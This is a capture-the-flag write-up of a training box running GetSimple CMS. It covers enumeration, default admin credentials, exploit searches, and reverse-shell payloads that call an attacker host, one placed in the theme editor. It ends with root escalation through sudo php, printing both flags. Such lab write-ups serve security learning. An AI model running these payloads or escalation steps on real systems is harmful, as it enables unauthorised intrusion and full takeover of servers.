#info
#reverseshell
# Preface
Target system: 10.129.153.142
Easy Box
Obtain User and Root Flag

# Enumeration
## Nmap Scan 
I'm starting with an Nmap scan of the target system
```
┌──(kali㉿kali)-[~/Desktop/kc]
└─$ nmap  -sC -sV -oA knowledgecheck2 -p 22,80 10.129.153.142
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 09:50 EDT
Nmap scan report for 10.129.153.142
Host is up (0.63s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
|_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin/
|_http-title: Welcome to GetSimple! - gettingstarted
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.56 seconds
```

- robots.txt is present #info 
### Confirming Nmap scan with banner grabbing

using -sV with nmap invokes  banner grabbing so this is redudant

```
┌──(kali㉿kali)-[~/Desktop/kc]
└─$ nc -nv 10.129.153.142 22                                 
(UNKNOWN) [10.129.153.142] 22 (ssh) open
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1

┌──(kali㉿kali)-[~/Desktop/kc]
└─$ nc -nv 10.129.153.142 80
(UNKNOWN) [10.129.153.142] 80 (http) open

```

# Web Footprinting

Visiting the web server:
![[Pasted image 20250604100649.png]]

- I can see that GetSimple CMS is being used to run the content on the web server #info
## Whatweb
```
┌──(kali㉿kali)-[/usr/share/wordlists/dirbuster]
└─$ whatweb http://10.129.153.142

http://10.129.153.142 [200 OK] AddThis, Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.153.142], Script[text/javascript], Title[Welcome to GetSimple! - gettingstarted]

```

- Apache 2.4.41 is being used on this webserver #info 
- The title confirms that this server is using GetSimple CMS
- Javascript is used on the webpage #info 
## Page Source

*Checking page source doesn't seem to have anything standing out, going to leave this for now*

![[Pasted image 20250604102022.png]]

## FFUF against web server
```
┌──(kali㉿kali)-[/usr/share/wordlists/dirbuster]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.129.153.142/FUZZ

data                    [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 53ms]
admin                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 47ms]
plugins                 [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 47ms]
theme                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 52ms]
backups                 [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 47ms]
<SNIP>
```

`-w: specifies worlist location`
`-u: specifies the url you want to run ffuf against`

- The results of the FFUF scan reveal #info 
	- data / admin / plugins / theme / backups

# Initial Foothold
## Manually checking /directories

### **Checking /robot.txt**
![[Pasted image 20250604102303.png]]
- confirms /admin/ #info 

### **Checking /admin/**
![[Pasted image 20250604102428.png]]
- login portal #info 
- tried admin / admin and logged into the portal #info 
![[Pasted image 20250604102541.png]]
- the bottom of the page gives the version of GetSimple CMS 
	- GetSimple CMS Version 3.3.15 #info
![[Pasted image 20250604102738.png]]
#### Pages Tab
The pages tab allows me to create a new page which then shows up in:
http://10.129.153/142/data/pages/
![[Pasted image 20250604111641.png]]
- 
#### Files Tab

#### Theme Tab

#### Backups Tab

#### Plugins Tab
#### Creating an Archive
through the Backups page I can create an archive for the website and download the file
![[Pasted image 20250604103248.png]]

*opening up the .zip archive there is an .htaccess file*
![[Pasted image 20250604103432.png]]
- the .xml files have important data #info 

*opening up the gsconfig.php there is information about the GSLOGINSALT*
![[Pasted image 20250604103750.png]]

*opening up the admin.xml file there is infromation on the email and password for the admin account *
![[Pasted image 20250604104128.png]]
- I tried running hashcat but I need to allocate more memory to my VM to do that
- so I just used an online hash cracker that scans a database of popular passwords to confirm the password was the admin / admin I found earlier
![[Pasted image 20250604105232.png]]

#### Health-Check #info 
By selecting the support button with the exclamation point if gives us a breakdown of:
- GetSimple Version
- Server Setup
- Data File Integrity Check
- Directory Permissions
- .htaccess Existence

### **Checking /data**
/data has all the information that was received from the archive generated earlier
- will be useful for viewing the location and selecting an uploaded file #info
 ![[Pasted image 20250604110544.png]]
### **Checking /plugins**
Contains information on the plugins that are installed, but there is no other information to be accessed
![[Pasted image 20250604110816.png]]

### **Checking /theme**
Contains information on the page them, but doesn't seem to have any useful information
![[Pasted image 20250604111022.png]]

### **Checking /backups**
Contains information on the backups, this is the same information contained in the backup earlier
![[Pasted image 20250604111145.png]]

### Creating a .php page with system calls
I tried creating a php page with `<?php system('id'); ?>`
![[Pasted image 20250604114204.png]]
- the page does not process the system call #info

## RECAP #info
- admin / admin is the logins for the admin login page
- Apache 2.4.41 is being used on the web server
- GetSimple CMS 3.3.15 is the version for the CMS
- I'm able to access the web directory through /data, /plugins, /theme, /backups
- the Pages tab on the admin panel allows me to create pages in php
	- these pages can be viewed at /index.php?id=(page name)
- I can edit the theme php within the theme tab in the admin panel

## Getting a shell
### Using Searchsploit
```
┌──(kali㉿kali)-[~/Desktop/kc]
└─$ searchsploit GetSimple
-------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                          |  Path
-------------------------------------------------------------------------------------------------------- ---------------------------------
Getsimple CMS 2.01 - 'changedata.php' Cross-Site Scripting                                              | php/webapps/34789.html
Getsimple CMS 2.01 - 'components.php' Cross-Site Scripting                                              | php/webapps/34041.txt
Getsimple CMS 2.01 - Local File Inclusion                                                               | php/webapps/12517.txt
Getsimple CMS 2.01 - Multiple Vulnerabilities                                                           | php/webapps/14338.html
Getsimple CMS 2.01 < 2.02 - Administrative Credentials Disclosure                                       | php/webapps/15605.txt
Getsimple CMS 2.03 - 'upload-ajax.php' Arbitrary File Upload                                            | php/webapps/35353.txt
Getsimple CMS 3.0 - 'set' Local File Inclusion                                                          | php/webapps/35726.py
Getsimple CMS 3.1.2 - 'path' Local File Inclusion                                                       | php/webapps/37587.txt
Getsimple CMS 3.2.1 - Arbitrary File Upload                                                             | php/webapps/25405.txt
GetSimple CMS 3.3.1 - Cross-Site Scripting                                                              | php/webapps/43888.txt
Getsimple CMS 3.3.1 - Persistent Cross-Site Scripting                                                   | php/webapps/32502.txt
Getsimple CMS 3.3.10 - Arbitrary File Upload                                                            | php/webapps/40008.txt
GetSimple CMS 3.3.13 - Cross-Site Scripting                                                             | php/webapps/44408.txt
GetSimple CMS 3.3.16 - Persistent Cross-Site Scripting                                                  | php/webapps/49726.py
GetSimple CMS 3.3.16 - Persistent Cross-Site Scripting (Authenticated)                                  | php/webapps/48850.txt
GetSimple CMS 3.3.4 - Information Disclosure                                                            | php/webapps/49928.py
GetSimple CMS Custom JS 0.1 - Cross-Site Request Forgery                                                | php/webapps/49816.py
Getsimple CMS Items Manager Plugin - 'PHP.php' Arbitrary File Upload                                    | php/webapps/37472.php
GetSimple CMS My SMTP Contact Plugin 1.1.1 - Cross-Site Request Forgery                                 | php/webapps/49774.py
GetSimple CMS My SMTP Contact Plugin 1.1.2 - Persistent Cross-Site Scripting                            | php/webapps/49798.py
GetSimple CMS Plugin Multi User 1.8.2 - Cross-Site Request Forgery (Add Admin)                          | php/webapps/48745.txt
GetSimple CMS v3.3.16 - Remote Code Execution (RCE)                                                     | php/webapps/51475.py
GetSimpleCMS - Unauthenticated Remote Code Execution (Metasploit)                                       | php/remote/46880.rb
-------------------------------------------------------------------------------------------------------- ---------------------------------
```

**I'm going to use GetSimple CMS v3.3.16 - Remote Code Execution (RCE)                                            php/webapps/51475.py**

*using -m I can mirror the exploit from exploitdb database*
```
┌──(kali㉿kali)-[~/Desktop/kc]
└─$ searchsploit -m php/webapps/51475.py
  Exploit: GetSimple CMS v3.3.16 - Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/51475
     Path: /usr/share/exploitdb/exploits/php/webapps/51475.py
    Codes: CVE-2022-41544
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/kali/Desktop/kc/51475.py
```

*I tried running the exploit, but there is no instruction on how to use it and I cant get it to work*
```
┌──(kali㉿kali)-[~/Desktop/kc]
└─$ python3 51475.py                       
/home/kali/Desktop/kc/51475.py:35: SyntaxWarning: invalid escape sequence '\?'
  match = re.search("jquery.getsimple.js\?v=(.*)\"", r.text)
Traceback (most recent call last):
  File "/home/kali/Desktop/kc/51475.py", line 16, in <module>
    import telnetlib
ModuleNotFoundError: No module named 'telnetlib'
```

This did not work because I was not using valid syntax
### Using msfconsole
```
msf6 > search GetSimple

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/unix/webapp/get_simple_cms_upload_exec    2014-01-04       excellent  Yes    GetSimpleCMS PHP File Upload Vulnerability
   1  exploit/multi/http/getsimplecms_unauth_code_exec  2019-04-28       excellent  Yes    GetSimpleCMS Unauthenticated RCE
```

```
msf6 > use 1
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > show options

Module options (exploit/multi/http/getsimplecms_unauth_code_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasplo
                                         it.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the cms
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.40.135   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   GetSimpleCMS 3.3.15 and before



View the full module info with the info, or info -d command.
```

*Entering in the options*
```
msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > set RHOSTS 10.129.153.32
RHOSTS => 10.129.153.32
msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > set TARGETURI /admin
TARGETURI => /admin
```

```
msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > exploit
[*] Started reverse TCP handler on 192.168.40.135:4444 
[-] Exploit aborted due to failure: not-vulnerable: It appears that the target is not vulnerable
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > 
```

I assume this didn't work because I was giving the wrong information into msfconsole
### Using a script off Github
```
──(kali㉿kali)-[~/Desktop/kc]
└─$ git clone https://github.com/cybersecaware/GetSimpleCMS-RCE.git
Cloning into 'GetSimpleCMS-RCE'...
remote: Enumerating objects: 13, done.
remote: Counting objects: 100% (13/13), done.
remote: Compressing objects: 100% (13/13), done.
remote: Total 13 (delta 1), reused 8 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (13/13), 552.31 KiB | 2.39 MiB/s, done.
Resolving deltas: 100% (1/1), done.


┌──(kali㉿kali)-[~/Desktop/kc]
└─$ ls
51475.py    GetSimpleCMS-RCE       knowledgecheck2.nmap  knowledgecheck.gnmap  knowledgecheck.xml
admin.hash  knowledgecheck2.gnmap  knowledgecheck2.xml   knowledgecheck.nmap


┌──(kali㉿kali)-[~/Desktop/kc]
└─$ cd GetSimpleCMS-RCE 


┌──(kali㉿kali)-[~/Desktop/kc/GetSimpleCMS-RCE]
└─$ ls
GetSimpleCMS-RCE.py  images  LICENSE  README.md
```

*making a python virtual environment so that I don't break anything*
```
──(kali㉿kali)-[~/Desktop/kc/GetSimpleCMS-RCE]
└─$ python3 -m  venv gs 
```

```
┌──(kali㉿kali)-[~/Desktop/kc/GetSimpleCMS-RCE]
└─$ source gs/bin/activate
```

*installing the required Python library for exploit*
```
┌──(gs)─(kali㉿kali)-[~/Desktop/kc/GetSimpleCMS-RCE]
└─$ pip install requests beautifulsoup4
Collecting requests
  Downloading requests-2.32.3-py3-none-any.whl.metadata (4.6 kB)
Collecting beautifulsoup4
  Downloading beautifulsoup4-4.13.4-py3-none-any.whl.metadata (3.8 kB)
Collecting charset-normalizer<4,>=2 (from requests)
  Downloading charset_normalizer-3.4.2-cp313-cp313-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (35 kB)
Collecting idna<4,>=2.5 (from requests)
  Downloading idna-3.10-py3-none-any.whl.metadata (10 kB)
Collecting urllib3<3,>=1.21.1 (from requests)
  Downloading urllib3-2.4.0-py3-none-any.whl.metadata (6.5 kB)
Collecting certifi>=2017.4.17 (from requests)
  Downloading certifi-2025.4.26-py3-none-any.whl.metadata (2.5 kB)
Collecting soupsieve>1.2 (from beautifulsoup4)
  Downloading soupsieve-2.7-py3-none-any.whl.metadata (4.6 kB)
Collecting typing-extensions>=4.0.0 (from beautifulsoup4)
  Downloading typing_extensions-4.14.0-py3-none-any.whl.metadata (3.0 kB)
Downloading requests-2.32.3-py3-none-any.whl (64 kB)
Downloading beautifulsoup4-4.13.4-py3-none-any.whl (187 kB)
Downloading certifi-2025.4.26-py3-none-any.whl (159 kB)
Downloading charset_normalizer-3.4.2-cp313-cp313-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (148 kB)
Downloading idna-3.10-py3-none-any.whl (70 kB)
Downloading soupsieve-2.7-py3-none-any.whl (36 kB)
Downloading typing_extensions-4.14.0-py3-none-any.whl (43 kB)
Downloading urllib3-2.4.0-py3-none-any.whl (128 kB)
Installing collected packages: urllib3, typing-extensions, soupsieve, idna, charset-normalizer, certifi, requests, beautifulsoup4
Successfully installed beautifulsoup4-4.13.4 certifi-2025.4.26 charset-normalizer-3.4.2 idna-3.10 requests-2.32.3 soupsieve-2.7 typing-extensions-4.14.0 urllib3-2.4.0
```

*running the script*
```
┌──(gs)─(kali㉿kali)-[~/Desktop/kc/GetSimpleCMS-RCE]
└─$ python3 GetSimpleCMS-RCE.py 
/home/kali/Desktop/kc/GetSimpleCMS-RCE/GetSimpleCMS-RCE.py:160: SyntaxWarning: invalid escape sequence '\('
  \033[0m"""

 _______  _______ _________   _______ _________ _______  _______  _        _______    _______  _______  _______             _______  _______  _______ 
(  ____ \(  ____ \__   __/  (  ____ \__   __/(       )(  ____ )( \      (  ____ \  (  ____ \(       )(  ____ \           (  ____ )(  ____ \(  ____ \                  
| (    \/| (    \/   ) (     | (    \/   ) (   | () () || (    )|| (      | (    \/  | (    \/| () () || (    \/           | (    )|| (    \/| (    \/                
| |      | (__       | |     | (_____    | |   | || || || (____)|| |      | (__      | |      | || || || (_____    _____   | (____)|| |      | (__                    
| | ____ |  __)      | |     (_____  )   | |   | |(_)| ||  _____)| |      |  __)     | |      | |(_)| |(_____  )  (_____)  |     __)| |      |  __)                   
| | \_  )| (         | |           ) |   | |   | |   | || (      | |      | (        | |      | |   | |      ) |           | (\ (   | |      | (                      
| (___) || (____/\   | |     /\____) |___) (___| )   ( || )      | (____/\| (____/\  | (____/\| )   ( |/\____) |           | ) \ \__| (____/\| (____/\                
(_______)(_______/   )_(     \_______)\_______/|/     \||/       (_______/(_______/  (_______/|/     \|\_______)           |/   \__/(_______/(_______/                                                                                                                                                                                
Created By: H088yHaX0R / (HTB - AKA: Marz0)                                                                                         
Works for GetSimpleCMS 3.3.15                                                                                                       
Enter the target URL (e.g., http://gettingstarted.htb): http://gettingstarted.htb
Enter the command to execute: id
```
*didn't work at first, but running with sudo fixed the problem*
*I also checked with the IP*
```
Enter the target URL (e.g., http://gettingstarted.htb): http://10.129.153.32
Enter the command to execute: id
[+] GetSimpleCMS version 3315 detected.
[+] Theme edit successful!
uid=33(www-data) gid=33(www-data) groups=33(www-data)

[*] Press Ctrl+C to exit.
```

*using the exploit to start a bash reverse shell*
```
Enter the target URL (e.g., http://gettingstarted.htb): http://gettingstarted.htb
Enter the command to execute: sh -i >& /dev/udp/ATTACKING IP/8080 0>&1
[+] GetSimpleCMS version 3315 detected.
[+] Theme edit successful!

[*] Press Ctrl+C to exit.
```

**but I don't get anything on the nc listener**
*let's try php reverse shell*
```
Enter the target URL (e.g., http://gettingstarted.htb): http://gettingstarted.htb
Enter the command to execute: php -r '$sock=fsockopen("ATTACKING IP",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
[+] GetSimpleCMS version 3315 detected.
[+] Theme edit successful!

[*] Press Ctrl+C to exit.
```
**still didn't get anything on my nc listener**

### Using the PHP Theme Editor within the Admin Panel #reverseshell
*i'm going to edit the theme php directly with this payload:*
`<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.3 9001 >/tmp/f"); ?>` 

![[Pasted image 20250604131746.png]]

*then select template.php*
![[Pasted image 20250604132148.png]]

BOOM! Reverse shell achieved. I don't know what syntax I was messing up with my earlier attempts, but I got it now
![[Pasted image 20250604132236.png]]

## Upgrading shell to fully functional

***This took me at least 2 hours***

There are a ton of issues that differ from the normal way to upgrade your terminal with python when using **zsh**

The **zsh** syntax and behavior caused issues with standard terminal upgrades, requiring specific steps to stabilize the **bash** reverse shell obtained on the target.

1. Get dummy shell
2. type `python3 -c 'import pty;pty.spawn("/bin/bash")'`
3. Ctrl + Z
4. type `stty size* - x / y`
5. type `stty raw -echo; fg` (same line)
6. hit enter x2
7. type `export TERM=xterm*-256color`
8. type `export SHELL=/bin/bash`
9. type `stty rows x columns y`
10. type `export PS1='\[\e[32m\]\u@\h:\[\e[34m\]\w\[\e[0m\]\$ '`
11. you should be good to use arrow keys now and other terminal things

### Getting User Flag
```
www-data@gettingstarted:/var/www/html/theme/Innovation$ cd /home
www-data@gettingstarted:/home$ ls
mrb3n
www-data@gettingstarted:/home$ cd mrb3n/
www-data@gettingstarted:/home/mrb3n$ ls
user.txt
www-data@gettingstarted:/home/mrb3n$ cat user.txt
7002d65b149b0a4d19132a66feed21d8
www-data@gettingstarted:/home/mrb3n$ 
```

# PrivEsc

I started by checking my sudo permissions
```
www-data@gettingstarted:/home/mrb3n$ sudo  -l
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
```

now i'm going to use the resource provided by the module GTFOBins to look up php and see if I can escalate privileges with this:
![[Pasted image 20250604171942.png]]

I can so it's time to use the command and see if I can get PrivEsc

```
www-data@gettingstarted:/var/www/html/theme/Innovation$ CMD="/bin/sh"

www-data@gettingstarted:/var/www/html/theme/Innovation$ sudo php -r "system('$CMD');"

id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
root.txt
snap
cat root.txt
f1fba6e9f71efb2630e6e34da6387842
```

BOOM! Able to achieve the root flag by setting a shell as a variable and running it within the php command
